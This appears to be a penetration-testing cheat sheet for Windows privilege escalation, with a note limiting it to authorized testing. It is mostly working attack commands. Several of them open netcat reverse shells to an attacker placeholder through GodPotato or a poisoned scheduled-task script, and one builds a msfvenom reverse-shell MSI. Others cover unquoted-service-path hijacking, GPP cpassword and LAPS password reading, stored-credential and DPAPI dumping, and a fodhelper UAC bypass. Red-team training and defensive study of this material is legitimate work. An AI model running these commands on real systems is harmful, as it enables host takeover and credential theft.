---
service: windows
title: Windows Privilege Escalation
ports: n/a
aliases: winenum
---

# Windows PrivEsc — quick wins

**When you see it:** you have a low-privilege shell or credentialed session on a
Windows host and want SYSTEM or local Administrator.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the
> target — get sign-off and clean up afterwards.

## Triage (read-only)
```powershell
whoami /all                                     # user, groups, privileges
systeminfo | findstr /i "os name version"       # build number
Get-Service | Where-Object {$_.Status -eq 'Running'} | Select Name,DisplayName
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
cmdkey /list                                    # saved credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null
```

## Quick wins

### SeImpersonatePrivilege / SeAssignPrimaryToken → Potato ✏️
```powershell
whoami /priv | findstr /i "impersonate"
# GodPotato (works Win10 through Server 2022):
.\GodPotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe ATT 4444"
# PrintSpoofer (Server 2016–2019, Win10):
.\PrintSpoofer.exe -i -c cmd.exe
# JuicyPotato (Server 2008–2016, requires valid CLSID):
.\JuicyPotato.exe -l 1337 -c "{CLSID}" -p cmd.exe -a "/c ..." -t *
```
*Why:* service accounts (IIS, MSSQL, etc.) default to SeImpersonatePrivilege; the
Potato family coerces a SYSTEM token via COM/DCOM or named-pipe impersonation.
Try GodPotato first — it needs no CLSID tuning.

### AlwaysInstallElevated ✏️
```powershell
# both keys must be 0x1:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# generate payload on attack box:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATT LPORT=4444 -f msi -o pwn.msi
# install on target:
msiexec /quiet /qn /i C:\Windows\Temp\pwn.msi
```
*Why:* both registry keys set to 1 → every MSI runs as SYSTEM regardless of who
installs it. Often set by lazy admins who wanted to avoid UAC.

### Unquoted service path + weak service permissions ✏️
```powershell
# find unquoted paths with spaces (LOLBAS / sc.exe):
wmic service get name,pathname,startmode | findstr /i /v "c:\windows\\"  | findstr /i /v """
# check write access to an intermediate dir (e.g. C:\Program Files\Vulnerable App\):
icacls "C:\Program Files\Vulnerable App"
# drop binary at unquoted segment:
copy C:\Windows\Temp\shell.exe "C:\Program Files\Vulnerable.exe"
sc start SERVICENAME   # or wait for reboot
```
*Why:* Windows resolves unquoted paths left-to-right; if you can write to an
earlier path segment the service loader picks up your binary instead. Cross-check
service `sc qc SERVICENAME` for `BINARY_PATH_NAME`.

### GPP cpassword (SYSVOL) ✏️
```powershell
# search accessible SYSVOL for Groups.xml / Services.xml:
findstr /S /I cpassword \\DC\SYSVOL\*.xml
# decrypt with Get-GPPCPassword (PowerSploit) or manually:
# key is publicly known AES-256 key Microsoft published
```
*Why:* pre-2014 Group Policy Preferences stored passwords AES-256 encrypted with a
static key Microsoft published in MSDN; any domain user can read SYSVOL.

### LAPS — read password if permitted
```powershell
# check if LAPS attribute is readable (domain context needed):
Get-AdmPwdPassword -ComputerName TARGET
# or raw LDAP:
([adsisearcher]"(ms-Mcs-AdmPwd=*)").FindAll() | % {$_.Properties["ms-mcs-admpwd"]}
```
*Why:* LAPS randomises local admin passwords but stores them in AD; if your
account has read rights on ms-Mcs-AdmPwd you get the local Administrator password
in cleartext.

### Stored credentials — cmdkey / Autologon / DPAPI
```powershell
cmdkey /list                                        # saved creds (runas /savecred)
runas /savecred /user:DOMAIN\ADMIN "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
# Autologon registry:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# DPAPI master keys → Mimikatz / SharpDPAPI (requires local-admin session):
.\SharpDPAPI.exe masterkeys /target:BLOBFILE
```
*Why:* cmdkey saves credentials that runas /savecred can replay without re-entry;
Autologon stores DefaultPassword in plaintext registry; DPAPI blobs decrypt to
credentials when you hold the user's master key (or domain backup key).

### UAC bypass (medium → high integrity)
```powershell
# fodhelper classic (no file drop, Win10 < 22H2 unpatched):
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" "(default)" "cmd.exe"
New-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```
*Why:* fodhelper is auto-elevated and reads HKCU registry, which a medium-integrity
process can write; redirecting its COM lookup spawns an elevated cmd with no UAC prompt.
Clean up the HKCU key afterwards.

### Token impersonation (IncognitoTokens / Invoke-TokenManipulation)
```powershell
# list delegation tokens in memory (requires SeImpersonatePrivilege or local-admin):
.\incognito.exe list_tokens -u
.\incognito.exe execute -c "DOMAIN\ADMIN" cmd.exe
```
*Why:* delegation tokens of higher-privileged users cached in LSASS can be
impersonated without their password; common after lateral movement to a server where
an admin has an active session.

### Scheduled task with writable path ✏️
```powershell
schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run"
# find tasks running as SYSTEM/admin that call a writable script:
icacls "C:\PATH\TO\SCRIPT.bat"
echo "C:\Windows\Temp\nc.exe -e cmd.exe ATT 4444" >> "C:\PATH\TO\SCRIPT.bat"
```
*Why:* scheduled tasks often run privileged binaries from paths regular users can
write; editing the script is code execution at next task trigger.

## aranum helpers
- `standalones/windows/Get-TokenPrivileges.ps1` — full `whoami /priv` parse, flags Potato-eligible privileges.
- `standalones/windows/Get-ServiceMisconfig.ps1` — weak service permissions + unquoted paths.
- `standalones/windows/Get-UnquotedServices.ps1` — unquoted service path finder with writeability check.
- `standalones/windows/Get-AlwaysInstallElevated.ps1` — both registry keys in one check.
- `standalones/windows/Get-GPPCPassword.ps1` — SYSVOL cpassword search + decryption.
- `standalones/windows/Get-LAPSPassword.ps1` — reads ms-Mcs-AdmPwd if accessible.
- `standalones/windows/Get-StoredCreds.ps1` — cmdkey list, Autologon registry, Vault dump.
- `standalones/windows/Get-DPAPIBlobs.ps1` — enumerate DPAPI master keys and credential blobs.
- `standalones/windows/Get-ScheduledTasks.ps1` — scheduled tasks running as SYSTEM with writable payloads.
- `standalones/windows/Get-WritablePathDirs.ps1` — writable directories in system PATH.
- `standalones/windows/Get-NamedPipes.ps1` — enumerate named pipes (Potato pivot target).
- `standalones/windows/Get-PrintNightmare.ps1` — PrintNightmare (CVE-2021-34527) applicability.
- `standalones/windows/Get-ADCSMisconfig.ps1` — ADCS ESC1–ESC8 misconfigurations.
- `standalones/windows/Test-CoercedAuth.ps1` — PetitPotam/PrinterBug-style NTLM coercion signal check.
- `standalones/windows/Get-PetitPotamSignals.ps1` — MS-EFSRPC/MS-DFSNM coercion surface enumeration.
- `standalones/windows/Invoke-PrivEscEnum.ps1` — full sweep, runs most of the above.
- `aranumtoolkit/network/bulk-enum-windows.py` (via `aranum.py bulk-windows`) — orchestrated
  full-host enumeration sweep, collects and structures output from standalones.

## Gotchas
- GodPotato needs a writable temp path and .NET 4; JuicyPotato fails on Server 2019+
  (DCOM restrictions) — fall back to PrintSpoofer or GodPotato.
- AlwaysInstallElevated requires **both** HKLM and HKCU keys set to 1; one key alone
  is not exploitable.
- GPP cpassword was patched by MS14-025 (KB2962486) — deploy is blocked for new GPPs,
  but legacy XML files in SYSVOL often survive for years.
- LAPS read access is not guaranteed even for domain admins without delegation — check
  `Get-AdmPwdPassword` permissions before assuming you can read it.
- fodhelper UAC bypass is patched on fully updated Win11 22H2+ hosts; check build
  before relying on it. Use UACME project for current bypass list.
- Token impersonation requires at minimum SeImpersonatePrivilege or local admin; works
  best on servers with interactive admin sessions.

## Sources
- HackTricks Windows Local Privilege Escalation (`book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation`).
- LOLBAS (`lolbas-project.github.io`) — living-off-the-land binaries for each technique.
- HackTricks RoguePotato/PrintSpoofer/GodPotato (`hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer`).
- PayloadsAllTheThings Windows PrivEsc (`github.com/swisskyrepo/PayloadsAllTheThings`).
- MS14-025 / GPP cpassword — Microsoft KB2962486; PowerSploit Get-GPPPassword.
- UACME project (`github.com/hfiref0x/UACME`) — UAC bypass matrix by Windows build.
